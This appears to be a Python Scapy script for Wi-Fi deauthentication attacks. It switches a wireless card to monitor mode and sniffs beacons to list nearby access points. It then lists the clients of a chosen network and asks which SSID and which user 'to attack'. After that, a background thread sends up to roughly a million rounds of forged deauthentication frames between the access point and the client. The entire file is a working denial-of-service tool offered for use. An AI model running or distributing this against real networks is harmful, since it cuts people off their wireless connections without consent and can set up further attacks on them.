from scapy.all import *
import logging
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth, Dot11Elt
import os
import argparse
from multiprocessing import Process
import threading as t

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

net_stick_iface = ""
ap_list = []
users_list = []
ssid_list = []
ap_mac = ""


def Wifi_scaning(iface):
    print("Scanning for access points...")
    print("press CTRL+C to stop the scanning")
    print("index         MAC            SSID")
    sniff(iface=iface, prn=AP_handler)


def Users_scaning(iface):
    print("Finds connected Clients")
    print("press CTRL+C to stop the scanning")
    print("index       Client MAC")
    sniff(iface=iface, prn=Users_handler)


def AP_handler(pkt):
    # if packet has 802.11 layer
    if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8:
        if pkt.addr2 not in ap_list:
            ap_list.append(pkt.addr2)
            # ssid_list.append(pkt[Dot11Elt].info.decode())
            ssid_list.append(pkt.info)
            # print(pkt[Dot11Elt].info.decode())
            print(len(ap_list) - 1, '     %s     %s ' % (pkt.addr2, pkt.info))


def Users_handler(pkt):
    global ap_mac
    # print(ap_mac)
    if pkt.haslayer(Dot11):
        if pkt.addr2 not in ap_list and pkt.addr1 == ap_mac and pkt.addr2 not in users_list:
            users_list.append(pkt.addr2)
            print(len(users_list) - 1, '     %s  ' % pkt.addr2)


# def scan():
def DeAuthLoop(iface, brdMac, BSSID, numOfPack):
    for i in range(0, numOfPack):
        # This creates a Dot11Deauth packet that will be used to kick everyone out of the target network
        # Addr1 is the broadcast addr
        # Addr2 is the target addr
        # Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network
        # pkt = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
        # sendp(pkt, iface=interface, count=100000000, inter=.001)  # Send deauth packet
        pkt_to_ap = RadioTap() / Dot11(addr1=brdMac, addr2=BSSID, addr3=BSSID) / Dot11Deauth()
        # Deauthentication Packet For Client
        pkt_to_c = RadioTap() / Dot11(addr1=BSSID, addr2=brdMac, addr3=brdMac) / Dot11Deauth()

        while numOfPack != 0:
            for i in range(50):
                print("sending client to ap")
                sendp(pkt_to_ap, iface=iface)
                print("sending ap to client")
                sendp(pkt_to_c, iface=iface)

            numOfPack -= 1


def scan(iface):
    global ap_mac
    os.system('ifconfig ' + iface + ' down')
    os.system('iwconfig ' + iface + ' mode monitor')
    os.system('ifconfig ' + iface + ' up')

    Wifi_scaning(iface)
    if len(ap_list) > 0:
        mac_adder_index = int(input("\nEnter the    index of the ssid you want to attack: "))
        print(ap_list)
        print(mac_adder_index)
        ap_mac = ap_list[mac_adder_index]
        print(ssid_list[mac_adder_index])
        ssid_name = ssid_list[mac_adder_index]
        ssid_name = str(ssid_name)
        Users_scaning(iface)
        user_adder_index = int(input("\nEnter the   index of the user you want to attack: "))
        deauth = t.Thread(target=start, args=(iface, ap_mac, users_list[user_adder_index], 1000000))
        deauth.daemon = True
        deauth.start()
        return deauth, ssid_name


def start(iface, ap, device, numOfPack):
    for i in range(0, numOfPack):
        # This creates a Dot11Deauth packet that will be used to kick everyone out of the target network
        # Addr1 is the broadcast addr
        # Addr2 is the target addr
        # Addr3 is used to target specific clients but I set it to the target addr to kick everyone off the network
        pkt_to_ap = RadioTap() / Dot11(addr1=device, addr2=ap, addr3=ap) / Dot11Deauth()
        # Deauthentication Packet For Client
        pkt_to_c = RadioTap() / Dot11(addr1=ap, addr2=device, addr3=device) / Dot11Deauth()

        while numOfPack != 0:
            for j in range(50):
                # print("sending client to ap")
                sendp(pkt_to_ap, iface=iface, verbose=0)
                # print("sending ap to client")
                sendp(pkt_to_c, iface=iface, verbose=0)

            numOfPack -= 1

